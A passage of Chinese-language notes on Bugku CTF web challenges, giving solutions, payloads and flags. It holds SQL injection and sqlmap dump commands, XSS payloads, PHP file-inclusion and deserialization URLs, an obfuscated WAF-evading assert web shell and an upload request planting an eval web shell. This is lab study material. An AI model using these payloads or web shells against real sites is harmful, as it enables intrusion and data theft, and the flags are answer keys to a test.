			    URI 用来指定要访问的页面。例如 “/index.html”。 
			35. 'PHP_AUTH_DIGEST'
			    当作为 Apache 模块运行时，进行 HTTP Digest 认证的过程中，此变量被设置成客户端发送的“Authorization” HTTP 头内容（以便作进一步的认证操作）。 
			36. 'PHP_AUTH_USER'
			    当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。 
			37. 'PHP_AUTH_PW'
			    当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。 
			38. 'AUTH_TYPE'
			    当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型。 
			39. 'PATH_INFO'
			    包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息，如果存在的话。例如，如果当前脚本是通过 URL http://www.example.com/php/path_info.php/some/stuff?foo=bar 被访问，那么 $_SERVER['PATH_INFO'] 将包含 /some/stuff。 
			40. 'ORIG_PATH_INFO'
			    在被 PHP 处理之前，“PATH_INFO” 的原始版本。 
		md5($key1)

		echo

		弱类型

		MD5碰撞

		http://120.24.86.145:8002/web16/index.php?kkeyey1=QNKCDZO&kkeyey2=240610708
		0e830400451993494058024219903391
		0e462097431906509019562988736854
		Bugku{OH_YOU_FIND_MY_MOMY}

20. 成绩单 90
	>快来查查成绩吧  
	>http://120.24.86.145:8002/chengjidan/

	解答：

		http://120.24.86.145:8002/chengjidan/index.php
		id=1' union select 1,2,3,4%23
		基于时间的盲注
		sqlmap.py -r r.txt -p id --dbs
		sqlmap.py -r r.txt -p id --tables -D skctf_flag
		sqlmap.py -r r.txt -p id --columns -T fl4g -D skctf_flag
		sqlmap.py -r r.txt -p id --dump -C skctf_flag -T fl4g -D skctf_flag

		BUGKU{Sql_INJECT0N_4813drd8hz4}

21. 秋名山老司机 100
	>http://120.24.86.145:8002/qiumingshan/  
	>是不是老司机试试就知道

	解答：

		http://www.bugku.com/thread-1057-1-1.html
		request:get与post
		res_g.encoding='UTF-8'
		正则表达式re.search(r'(\d+[+-*/])+(\d+)).group()'
		eval(exprssion)
		
		Bugku{YOU_DID_IT_BY_SECOND}

22. 速度要快 100
	>速度要快！！！！！！  
	><http://120.24.86.145:8002/web6/>  
	>格式KEY{xxxxxxxxxxxxxx}

	解答：

		flag隐藏在get请求的response里
		headers是一个对象（字典）
		python split()将字符串切割h['flag'].split(':')[1]

		二次based4编码
		margin = base64.b64decode(base64.b64decode(h['flag']).split(':')[1])
		post提交数据data{'margin':flag}

		KEY{111dd62fcd377076be18a}

23. cookies欺骗 100
	>http://120.24.86.145:8002/web11/
	>答案格式：KEY{xxxxxxxx}

	解答：
		
		http://120.24.86.145:8002/web11/index.php?line=&filename=a2V5cy50eHQ=
		url上的参数有base64编码，解码发现是key.txt
		file文件包含，file协议：file:///d:/images/pic.gif
		将index.php进行based4编码后提交，发现是按行返回index.php的内容
		依次读取前二十行，将内容写入cookie.txt中，进行代码审计
		构造cookie margin=margin 然后读keys.php即可

		error_reporting(0)
		isset
		base64_decode
		$_GET[]
		intval()
		header()
		array()
		$file_list[2]='keys.php';
		in_array($file, $file_list)
		file($file)
		echo

24. XSS 100
	>http://103.238.227.13:10089/
	>Flag格式:Flag:xxxxxxxxxxxxxxxxxxxxxxxx

	解答：

		XSS跨站脚本攻击
		XSS绕过waf:unicode编码绕过\u003c，\u003e
		html编码
		本题采用html编码对特殊字符进行编码，采用Unicode编码即可绕过
		var s=””;
		document.getElementById(‘s’).innerHTML= s;
		这题没有声名注入点，到处查查发现是在id处（get）注入，id值替换s。题目中的框内为空，利用document.getElementById(‘s’).innerHTML = s;

		alert('Flag:17f094325e90085b30a5ddefce34acd8')
		
		payload:
		http://103.238.227.13:10089/?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e
		http://103.238.227.13:10089/?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e

25. never give up 100
	>http://120.24.86.145:8006/test/hello.php
	>
	
	解答：

		查看网页源代码，注释中有<!--1p.html-->
		直接访问1p.html,发现有301重定向，抓包查看或者利用viewsource
			view-source:http://120.24.86.145:8006/test/1p.html
		对网页中的js进行urldecode,得到based64编码的内容，然后再进行一次url解码

		payload:
			http://120.24.86.145:8006/test/hello.php?id=.&a=php://input&b=%00123456
			post:bugku is a nice plateform!

		直接访问http://120.24.86.145:8006/test/f4l2a3g.txt

		urldecode、二次编码及其绕过
		base64decode
		stripos及其绕过
		php伪协议
			http://php.net/manual/zh/wrappers.php.php
		id=0弱类型
		strlen()
		eregi及其绕过
		substr及其绕过
		
		flag{tHis_iS_THe_fLaG} 

26. welcome to bugkuctf 100
	>http://120.24.86.145:8006/test1/

	解答：

		参考文章：http://pupiles.com/suibi2.html

		http://120.24.86.145:8006/test1/?txt=php://input&file=php://filter/read=convert.base64-encode/resource=hint.php&password=
		welcome to the bugkuctf

	```PD9waHAgIA0KICANCmNsYXNzIEZsYWd7Ly9mbGFnLnBocCAgDQogICAgcHVibGljICRmaWxlOyAgDQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9zdHJpbmcoKXsgIA0KICAgICAgICBpZihpc3NldCgkdGhpcy0+ZmlsZSkpeyAgDQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgDQoJCQllY2hvICI8YnI+IjsNCgkJcmV0dXJuICgiZ29vZCIpOw0KICAgICAgICB9ICANCiAgICB9ICANCn0gIA0KPz4gIA==```

		<?php  
  
		class Flag{//flag.php  
		    public $file;  
		    public function __tostring(){  
		        if(isset($this->file)){  
		            echo file_get_contents($this->file); 
					echo "<br>";
				return ("good");
		        }  
		    }  
		}  
		?>   

		http://120.24.86.145:8006/test1/?txt=php://input&file=php://filter/read=convert.base64-encode/resource=flag.php&password=
		不能现在就给你flag

		http://120.24.86.145:8006/test1/?txt=php://input&file=php://filter/read=convert.base64-encode/resource=index.php&password=
		welcome to the bugkuctf
	```PD9waHAgIA0KJHR4dCA9ICRfR0VUWyJ0eHQiXTsgIA0KJGZpbGUgPSAkX0dFVFsiZmlsZSJdOyAgDQokcGFzc3dvcmQgPSAkX0dFVFsicGFzc3dvcmQiXTsgIA0KICANCmlmKGlzc2V0KCR0eHQpJiYoZmlsZV9nZXRfY29udGVudHMoJHR4dCwncicpPT09IndlbGNvbWUgdG8gdGhlIGJ1Z2t1Y3RmIikpeyAgDQogICAgZWNobyAiaGVsbG8gZnJpZW5kITxicj4iOyAgDQogICAgaWYocHJlZ19tYXRjaCgiL2ZsYWcvIiwkZmlsZSkpeyANCgkJZWNobyAi5LiN6IO9546w5Zyo5bCx57uZ5L2gZmxhZ```

		<?php  
			$txt = $_GET["txt"];  
			$file = $_GET["file"];  
			$password = $_GET["password"];  
			  
			if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
			    echo "hello friend!<br>";  
			    if(preg_match("/flag/",$file)){ 
					echo "不能现在就给你flag哦";
			        exit();  
			    }else{  
			        include($file);   
			        $password = unserialize($password);  
			        echo $password;  
			    }  
			}else{  
			    echo "you are not the number of bugku ! ";  
			}  
			  
			?>  
			  
			<!--  
			$user = $_GET["txt"];  
			$file = $_GET["file"];  
			$pass = $_GET["password"];  
			  
			if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
			    echo "hello admin!<br>";  
			    include($file); //hint.php  
			}else{  
			    echo "you are not admin ! ";  
			}  
			 -->  

			php序列化与反序列化

			php文件包含
				https://www.waitalone.cn/php-file-include.html
				php://filter仅可以用一次，php://input可多次重复使用
			file_get_contents() 函数把整个文件读入一个字符串中。
			http://120.24.86.145:8006/test1/?txt=php://input&file=hint.php&password=O:4:"Flag":1:{s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}
			welcome to the bugkuctf

			<?php  
				//flag{php_is_the_best_language}  
			?>

27. 过狗一句话 100
	>http://120.24.86.145:8010/
	>送给大家一个过狗一句话  
	
	hint:
	
		<?php 
			$poc="a#s#s#e#r#t"; 
			$poc_1=explode("#",$poc); 
			$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 
			$poc_2($_GET['s']) 
		?>
	
	解答：

		explode()

		http://120.24.86.145:8010/?s=print_r(scandir('./'))
		Array ( [0] => . [1] => .. [2] => 2.php [3] => 3.php [4] => 4.php [5] => 5.php [6] => a.php [7] => a.txt [8] => c.php [9] => conn [10] => f.html [11] => f.php [12] => flag.txt [13] => h.php [14] => haha.php [15] => index.php [16] => shell.php [17] => t2.php [18] => txxxc.php ) 

		http://120.24.86.145:8010/flag.txt
		BUGKU{bugku_web_009801_a}

		php代码执行漏洞

		http://120.24.86.145:8010/?s=print_r(file_get_contents('flag.txt')); 
		http://120.24.86.145:8010/?s=print_r(file_get_contents('shell.php')); 

28. 字符？正则？ 100
	>字符？正则？
	>http://120.24.86.145:8002/web10/
										
	解答：

		 <?php 
			highlight_file('2.php');
			$key='KEY{********************************}';
			$IM= preg_match("/key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i", trim($_GET["id"]), $match);
			if( $IM ){ 
			  die('key is: '.$key);
			}
			?> 
		
		php正则表达式
			[[:alpha:]] 	任何字母
			[[:digit:]] 	任何数字
			[[:alnum:]] 	任何字母和数字
			[[:space:]] 	任何空白字符
			[[:upper:]] 	任何大写字母
			[[:lower:]] 	任何小写字母
			[[:punct:]] 	任何标点符号
			[[:xdigit:]] 	任何16进制的数字，相当于[0-9a-fA-F]
		preg_match()
			php的正则表达式匹配函数
			int preg_match ( string $pattern , string $subject [, array &$matches [, int $flags = 0 [, int $offset = 0 ]]] )

			搜索 subject 与 pattern 给定的正则表达式的一个匹配。

			参数说明：			
			    $pattern: 要搜索的模式，字符串形式。			
			    $subject: 输入字符串。			
			    $matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。			
			    $flags：flags 可以被设置为以下标记值：			
			        PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。			
			    offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。

		trim()
			trim() 函数移除字符串两侧的空白字符或其他预定义字符。		
    		ltrim() - 移除字符串左侧的空白字符或其他预定义字符
    		rtrim() - 移除字符串右侧的空白字符或其他预定义字符
			charlist:	
			    "\0" - NULL
			    "\t" - 制表符
			    "\n" - 换行
			    "\x0B" - 垂直制表符
			    "\r" - 回车
			    " " - 空格


		highlight_file()
			showsource()

		payload:http://120.24.86.145:8002/web10/index.php?id=key1key2222key:/3/4keya:	

		 key is: KEY{0x0SIOPh550afc}

29. 前女友(SKCTF) 100
	>http://118.89.219.210:49162/  
	>flag格式：SKCTF{xxxxxxxxxxxxxxxxxx}
	>

	解答：

		右键查看源代码，发现code.txt
		http://118.89.219.210:49162/code.txt
		<?php
			if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
			    $v1 = $_GET['v1'];
			    $v2 = $_GET['v2'];
			    $v3 = $_GET['v3'];
			    if($v1 != $v2 && md5($v1) == md5($v2)){
			        if(!strcmp($v3, $flag)){
			            echo $flag;
			        }
			    }
			}
			?>
		
		php弱类型，md5无法处理数组，strcmp可通过传入数组绕过
		240610708，aabC9RqS的MD5值为0e开头

		http://118.89.219.210:49162/?v1[]=1&v2[]=2&v3[]=
		http://118.89.219.210:49162/?v1=240610708&v2=aabC9RqS&v3[]=
		SKCTF{Php_1s_tH3_B3St_L4NgUag3}
			
30. login1(SKCTF) 100
	>http://118.89.219.210:49163/
	>flag格式：SKCTF{xxxxxxxxxxxxxxxxx}
	>hint:SQL约束攻击

	解答：

		知识点：
		1. 在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”
		2. 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。
		3. 但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。
		
		注册用户名：admin                                                        1
		密码：random_pass
	
		登录用户名：admin
		密码：random_pass
	
		SKCTF{4Dm1n_HaV3_GreAt_p0w3R} 

31. 你从哪里来 100
	>http://120.24.86.145:9009/from.php

	解答：

		Referer: http://www.google.com

32. 各种绕过 110
	>各种绕过哟
	>http://120.24.86.145:8002/web7/

	解答：

		<?php
			highlight_file('flag.php');
			$_GET['id'] = urldecode($_GET['id']);
			$flag = 'flag{xxxxxxxxxxxxxxxxxx}';
			if (isset($_GET['uname']) and isset($_POST['passwd'])) {
			    if ($_GET['uname'] == $_POST['passwd'])
			
			        print 'passwd can not be uname.';
			
			    else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))
			
			        die('Flag: '.$flag);
			
			    else
			
			        print 'sorry!';
			} 
		?>

		http://120.24.86.145:8002/web7/index.php?id=margin&uname[]=a
		POST:passwd[]=b

		flag{HACK_45hhs_213sDD}

		urldecode()
		$_GET[]
		highlight_file('flag.php')

		sha1()
			sha1() 函数计算字符串的 SHA-1 散列。
			sha1() 函数使用美国 Secure Hash 算法 1。
			来自 RFC 3174 的解释 - 美国 Secure Hash 算法 1：SHA-1 产生一个名为报文摘要的 160 位的输出。报文摘要可以被输入到一个可生成或验证报文签名的签名算法。对报文摘要进行签名，而不是对报文进行签名，这样可以提高进程效率，因为报文摘要的大小通常比报文要小很多。数字签名的验证者必须像数字签名的创建者一样，使用相同的散列算法。
			
			提示：如需计算文件的 SHA-1 散列，请使用 sha1_file() 函数。

			漏洞：sha1()函数无法处理数组类型。所以只有让uname和passwdget值为数组时的哈希值恒为false，即恒等条件成立

33. web8 110
	>txt？？？？
	>http://120.24.86.145:8002/web8/

	解答：

		 <?php
			extract($_GET);
			if (!empty($ac))
			{
			$f = trim(file_get_contents($fn));
			if ($ac === $f)
			{
			echo "<p>This is flag:" ." $flag</p>";
			}
			else
			{
			echo "<p>sorry!</p>";
			}
			}
			?>
			
			
		extract($_GET)
		file_get_contents($fn)

		提示有txt,访问发现有flag.txt,内容为flags，让$ac与$f的值完全相等

		payload:
			http://120.24.86.145:8002/web8/flag.txt
			http://120.24.86.145:8002/web8/?ac=flags&fn=flag.txt
		flag：
			flag{3cfb7a90fc0de31}

34. 细心 130
	>地址：http://120.24.86.145:8002/web13/  
	>想办法变成admin

	解答：

		http://120.24.86.145:8002/web13/robots.txt
		http://120.24.86.145:8002/web13/resusl.php
		http://120.24.86.145:8002/web13/resusl.php?x=admin
		构造x=admin

		flag(ctf_0098_lkji-s)

35. 求getshell 150
	>求getshell
	>http://120.24.86.145:8002/web9/

	解答：

		测试与探测
		upload/20180312120336_541.jpg，上传成功后重命名
		截断上传、解析漏洞等都无法绕过上传
		存在后缀名黑名单、类型检测（http头Content-Type，文件类型Content-Type）
		php别名：php2, php3, php4, php5, phps, pht, phtm, phtml，发现php5可以绕过
		http头的Content-type一下大小写绕过
		文件Content-type：image/jpeg


		POST /web9/index.php HTTP/1.1
		Host: 120.24.86.145:8002
		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
		Accept-Language: zh-CN,en-US;q=0.5
		Content-Type: Multipart/form-data; boundary=---------------------------2342412517843
		Content-Length: 312
		Referer: http://120.24.86.145:8002/web9/index.php
		Cookie: sYQDUGqqzHsearch_history=%7C1
		Connection: close
		Upgrade-Insecure-Requests: 1
		
		-----------------------------2342412517843
		Content-Disposition: form-data; name="file"; filename="1.php5"
		Content-Type: image/jpeg
		
		<?php eval($_POST['123'])?>
		-----------------------------2342412517843
		Content-Disposition: form-data; name="submit"
		
		Submit
		-----------------------------2342412517843--
	

		KEY{bb35dc123820e}

36. INSERT INTO注入 150
	>地址：http://120.24.86.145:8002/web15/  
	>flag格式：flag{xxxxxxxxxxxx}  
	不如写个Python吧    
	
		error_reporting(0);
		
		function getIp(){
		$ip = '';
		if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}else{
		$ip = $_SERVER['REMOTE_ADDR'];
		}
		$ip_arr = explode(',', $ip);
		return $ip_arr[0];
		
		}
		
		$host="localhost";
		$user="";
		$pass="";
		$db="";
		
		$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");
		
		mysql_select_db($db) or die("Unable to select database");
		
		$ip = getIp();
		echo 'your ip is :'.$ip;
		$sql="insert into client_ip (ip) values ('$ip')";
		mysql_query($sql);

	解答：

		http头注入
		二次注入
		insert注入
			http://blog.csdn.net/ysynhtt/article/details/45115849
		报错注入
		时间延迟的盲注

		SQL:
		https://www.1keydata.com/
		substring()
			SubString(string, int, int)  
			作用：返回第一个参数中从第二个参数指定的位置开始、第三个参数指定的长度的子字符串。
		select case when
			https://www.cnblogs.com/aipan/p/7770611.html
			Case具有两种格式。简单Case函数和Case搜索函数。
			简单Case函数
			CASE sex
			WHEN '1' THEN '男'
			WHEN '2' THEN '女'
			ELSE '其他' END
			 
			--Case搜索函数 
			CASE WHEN sex = '1' THEN '男' 
			WHEN sex = '2' THEN '女' 
			ELSE '其他' END  
			   种方式，可以实现相同的功能。简单Case函数的写法相对比较简洁，但是和Case搜索函数相比，功能方面会有些限制，比如写判断式。还有一个需要注意的问题，Case函数只返回第一个符合条件的值，剩下的Case部分将会被自动忽略。
		sleep()
		concat()
		ascii()
		mid()

		python:
			.format()
			https://www.cnblogs.com/gide/p/6955895.html
				#通过位置
				print '{0},{1}'.format('chuhao',20)
				
				print '{},{}'.format('chuhao',20)
				
				print '{1},{0},{1}'.format('chuhao',20)
				
				#通过关键字参数
				print '{name},{age}'.format(age=18,name='chuhao')
				
				class Person:
				    def __init__(self,name,age):
				        self.name = name
				        self.age = age
				
				    def __str__(self):
				        return 'This guy is {self.name},is {self.age} old'.format(self=self)
				
				print str(Person('chuhao',18))
				
				#通过映射 list
				a_list = ['chuhao',20,'china']
				print 'my name is {0[0]},from {0[2]},age is {0[1]}'.format(a_list)
				#my name is chuhao,from china,age is 20
				
				#通过映射 dict
				b_dict = {'name':'chuhao','age':20,'province':'shanxi'}
				print 'my name is {name}, age is {age},from {province}'.format(**b_dict)
				#my name is chuhao, age is 20,from shanxi
				
				#填充与对齐
				print '{:>8}'.format('189')
				#     189
				print '{:0>8}'.format('189')
				#00000189
				print '{:a>8}'.format('189')
				#aaaaa189
				
				#精度与类型f
				#保留两位小数
				print '{:.2f}'.format(321.33345)
				#321.33
				
				#用来做金额的千位分隔符
				print '{:,}'.format(1234567890)
				#1,234,567,890
				
				#其他类型 主要就是进制了，b、d、o、x分别是二进制、十进制、八进制、十六进制。
				
				print '{:b}'.format(18) #二进制 10010
				print '{:d}'.format(18) #十进制 18
				print '{:o}'.format(18) #八进制 22
				print '{:x}'.format(18) #十六进制12
			异常
			字符串函数
			requests
		
		client-ip,X-forwarded-for,remote-addr

		error_reporting(0);
			<?php
			 // 关闭错误报告
			 error_reporting(0);
			
			 // 报告 runtime 错误
			 error_reporting(E_ERROR | E_WARNING | E_PARSE);
			
			 // 报告所有错误
			 error_reporting(E_ALL);
			
			 // 等同 error_reporting(E_ALL);
			 ini_set("error_reporting", E_ALL);
			
			 // 报告 E_NOTICE 之外的所有错误
			 error_reporting(E_ALL & ~E_NOTICE);
			?> 
		
		payload="11'+(select case when (substring((select flag from flag ) from {0} for 1 )='{1}') then sleep(3) else 1 end ) and '1'='1".format(str(i),str1)

		flag：flag{cdbf14c9551d5be5612f7bb5d2867853}

37. 这是一个神奇的登陆框  
	>150  
	>http://120.24.86.145:9001/sql/  
	>flag格式flag{}

	解答：

		注入的分隔符都用的是单引号‘，这道题特立独行用的是双引号"。
		又发现有报错的回显，于是报错注入：
		一开始使用的updatexml和extractvalue这两个函数来进行的报错注入，后来发现这两个函数的报错注入有缺陷，报错信息的长度不超过32位，对于这道题来说，flag是一个md5摘要，长度正好32位，而又会用到concat函数来连接，就会显示不完全。
		所以这道题的注入还是使用基于floor()和rand() 的报错注入 

		探测用户名：
			http://120.24.86.145:9001/sql/
			admin_name=1" or 1=1%23&admin_passwd=1&submit=GO+GO+GO
		爆数据库信息
			http://120.24.86.145:9001/sql/
			1. 数据库名
			admin_name=AdMiNhEhE&admin_passwd=1" and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(database()))x from information_schema.tables group by x )a) and "1" = "1&submit=GO+GO+GO
			admin_name=AdMiNhEhE&admin_passwd=1" and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(SELECT schema_name FROM information_schema.SCHEMATA limit 1,2))x from information_schema.tables group by x )a) and "1" ="1&submit=GO+GO+GO
			admin_name=AdMiNhEhE&admin_passwd=1" and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(SELECT table_schema FROM information_schema.SCHEMATA limit 1,2))x from information_schema.tables group by x )a) and "1" ="1&submit=GO+GO+GO
			bugkusql1
			2. 数据库版本信息
			admin_name=AdMiNhEhE&admin_passwd=1" and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(version()))x from information_schema.tables group by x )a) and "1" = "1&submit=GO+GO+GO
			5.5.34-log
			3. 表名
			admin_name=AdMiNhEhE&admin_passwd=1" and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bugkusql1'  limit 1))x from information_schema.tables group by x )a) and "1" = "1&submit=GO+GO+GO
			flag1
			4. 列名
			admin_name=AdMiNhEhE&admin_passwd=1" and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(SELECT column_NAME FROM information_schema.columns  WHERE TABLE_SCHEMA = 'bugkusql1' and table_name='flag1'  limit 1))x from information_schema.tables group by x )a) and "1" = "1&submit=GO+GO+GO
			flag1
			5. 列内容
			admin_name=AdMiNhEhE&admin_passwd=1" and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(SELECT flag1 FROM flag1  limit 1))x from information_schema.tables group by x )a) and "1" = "1&submit=GO+GO+GO
			ed6b28e684817d9efcaf802979e57aea

			flag{ed6b28e684817d9efcaf802979e57aea}

38. 多次 150
	>http://120.24.86.145:9004
	>本题有2个flag
	>flag格式 flag{}

	解答:

		sql数字型注入
		http://120.24.86.145:9004/1ndex.php?id=1'%23 		//成功
		
		异或注入探测过滤的关键字
		http://120.24.86.145:9004/1ndex.php?id=1'^(0)^ '	//成功
		http://120.24.86.145:9004/1ndex.php?id=1'^(1)^ '	//error
		http://120.24.86.145:9004/1ndex.php?id=1'^(length('union'))^ '//成功
		//过滤union，select,and,order,
		//没有过滤limit,from,where,ord,mid
	
		尝试绕过过滤，既然union这些都是被过滤掉了
		那构造ununionion 一旦union被过滤，删除了，那剩下来的还是union
		http://120.24.86.145:9004/1ndex.php?id=1' anandd 1=2 uniounionn selecselectt 1,2%23
		http://120.24.86.145:9004/1ndex.php?id=1' anandd 1=2%23
		uniounionn selecselectt
		http://120.24.86.145:9004/1ndex.php?id=1' anandd 1=2 uniounionn selecselectt 1,database()%23
		//web1002-1
		http://120.24.86.145:9004/1ndex.php?id=1' anandd 1=2 uniounionn selecselectt 1,version()%23
		5.5.34-log
		http://120.24.86.145:9004/1ndex.php?id=1' anandd 1=2 uniounionn selecselectt 1,user()%23
		web1002-1@localhost
		http://120.24.86.145:9004/1ndex.php?id=1' anandd 1=2 uniounionn selecselectt 1,selecselectt TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'web1002-1'%23
		//无返回值，怀疑无information_schema数据库
		
		逐字猜解法，测试表名、列名，字段值
	
	
		http://120.24.86.145:9004/1ndex.php?id=1' anandd 1=2 uniounionn selecselectt 1,(selecselectt flag1 from flag1)%23
		usOwycTju+FTUUzXosjr
	
		http://120.24.86.145:9004/1ndex.php?id=1' anandd 1=2 uniounionn selecselectt 1,(selecselectt address from flag1)%23
		./Once_More.php
		注入测试，有回显，过滤union,select，sleep,substr
		%0b,%10等换行符可以绕过
		payload:
			1. url = "http://120.24.86.145:9004/Once_More.php?id=1'and  (select locate(binary'" + str(i) + "',(select table_name from information_schema.tables where table_schema=database() limit 0,1)," + str(j) + "))=" + str(j) + "%23"
			//table_name
			2. url = "http://120.24.86.145:9004/Once_More.php?id=1'and (select locate(binary'" + str(i) + "',(select column_name from information_schema.columns where table_schema=database() limit 0,1)," + str(j) + "))=" + str(j) + "%23"
			//column_name
			3. url = "http://120.24.86.145:9004/Once_More.php?id=1'and (select locate(binary'"+str(i)+"',(select flag2 from flag2),"+str(j)+"))="+str(j)+"%23"
			//flag
			4. url = "http://120.24.86.145:9004/Once_More.php?id=1'and (select locate(binary'"+str(i)+"',(select user()),"+str(j)+"))="+str(j)+"%23"
			//user
	
		LOCATE(substr,str), 　　LOCATE(substr,str,pos)
		第一个语法返回字符串str第一次出现的子串substr的位置。
		第二个语法返回第一次出现在字符串str的子串substr的位置，从位置pos开始。 substr不在str中，则返回0。
		flag{Bugku-sql_6s-2i-4t-bug}
	
		sqlmap tamper
		sqlmap 前后缀
		sqlmap.py -u http://120.24.86.145:9004/1ndex.php?id=1 --suffix="%23" --tamper=uniounionn.py
			Parameter: id (GET)
		    Type: boolean-based blind
		    Title: AND boolean-based blind - WHERE or HAVING clause
		    Payload: id=1' AND 5235=5235#
		
		    Type: AND/OR time-based blind
		    Title: MySQL >= 5.0.12 AND time-based blind
		    Payload: id=1' AND SLEEP(5)#
	
		C:\Users\admin\.sqlmap\output\120.24.86.145
		sqlmap.py -u http://120.24.86.145:9004/1ndex.php?id=1 --suffix="%23" --tables -D web1002-1 --tamper=uniounionn.py

39. 头等舱
	>60
	>http://120.24.86.145:9009/hd.php

	解答：

		

40. md5 collision(NUPT_CTF) 100
	>http://120.24.86.145:9009/md5.php

		<?php
			$md51 = md5(‘QNKCDZO‘);
			$a = @$_GET[‘a‘];
			$md52 = @md5($a);
			if(isset($a)){
			if ($a != ‘QNKCDZO‘ && $md51 == $md52) {
			    echo "nctf{*****************}";
			} else {
			    echo "false!!!";
			}}
			else{echo "please input a";}
			?>

	php弱类型，md5('QNKCDZO')==md5('240610708')
	http://120.24.86.145:9009/md5.php?a=240610708
	flag{md5_collision_is_easy}
	
41. PHP_encrypt_1(ISCCCTF) 150
	
		<?php
		function encrypt($data,$key)
		{
		    $key = md5('ISCC');
			//729623334f0aa2784a1599fd374c120d
		    $x = 0;
		    $len = strlen($data);
		    $klen = strlen($key);
			$char='';
			$str='';
		    for ($i=0; $i < $len; $i++) { 
		        if ($x == $klen)
		        {
		            $x = 0;
		        }
		        $char .= $key[$x];
		        $x+=1;
		    }
		    for ($i=0; $i < $len; $i++) {
		        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
		    }
		    return base64_encode($str);
			echo base64_encode($str);
		}
		encrypt('ISCCCTF','729623334f0aa2784a1599fd374c120d')
		?>

	解答：
	
		729623334f0aa2784a1599fd374c120d
		import hashlib
		m2 = hashlib.md5()
		m2.update(key)	
		print m2.hexdigest()


##WEB进阶（综合渗透）
1. phpcmsV9 100
	>一个靶机而已，别搞破坏。  
	flag在根目录里txt文件里  
	http://120.24.86.145:8001/

	解答：

		http://120.24.86.145:8001/robots.txt
		
		http://120.24.86.145:8001/index.php?m=admin&c=index&a=login&pc_hash=

2. 海洋CMS 100

	>地址：http://120.24.86.145:8008/
	>flag在根目录某个txt里

	解答：

		http://120.24.86.145:8008/

		http://120.24.86.145:8008/admin/login.php?gotopage=%2Fadmin%2F
		http://120.24.86.145:8008/include/vdimgck.php

##RE
1. Easy_vb 60  
	思路：
		
		IDA打开文件，搜索关键字：flag,key,ctf等
		MCTF{_N3t_Rev_1s_E4ay_}

2. Easy_Re 60  
	>flag格式：DUTCTF{xxxx}
	>Hint: 1.逆向常用的工具有IDA 、ollydbg


3. 游戏过关 60
	>作者：Docupa

	



##代码审计
1. extract变量覆盖 50
	>http://120.24.86.145:9009/1.php  
	<?php
	$flag='xxx';
	extract($_GET);
	if(isset($shiyan))
	{
	$content=trim(file_get_contents($flag));
	if($shiyan==$content)
	{
	echo'flag{xxx}';
	}
	else
	{
	echo'Oh.no';
	}
	}
	?>

	解答：

		变量覆盖漏洞
		http://blog.csdn.net/hitwangpeng/article/details/45972099

		payload:
			http://120.24.86.145:9009/1.php?shiyan=&flag=
		flag：
			flag{bugku-dmsj-p2sm3N}

2. strcmp比较字符串 50
	>http://120.24.86.145:9009/6.php  
	<?php
	$flag = "flag{xxxxx}";
	if (isset($_GET['a'])) {
	if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。
	//比较两个字符串（区分大小写）
	die('Flag: '.$flag);
	else
	print 'No';
	}
	?>

	解答：

		php弱类型绕过strcmp
			strcmp不接受数组类型
		payload:
			http://120.24.86.145:9009/6.php?a[]=
		flag：
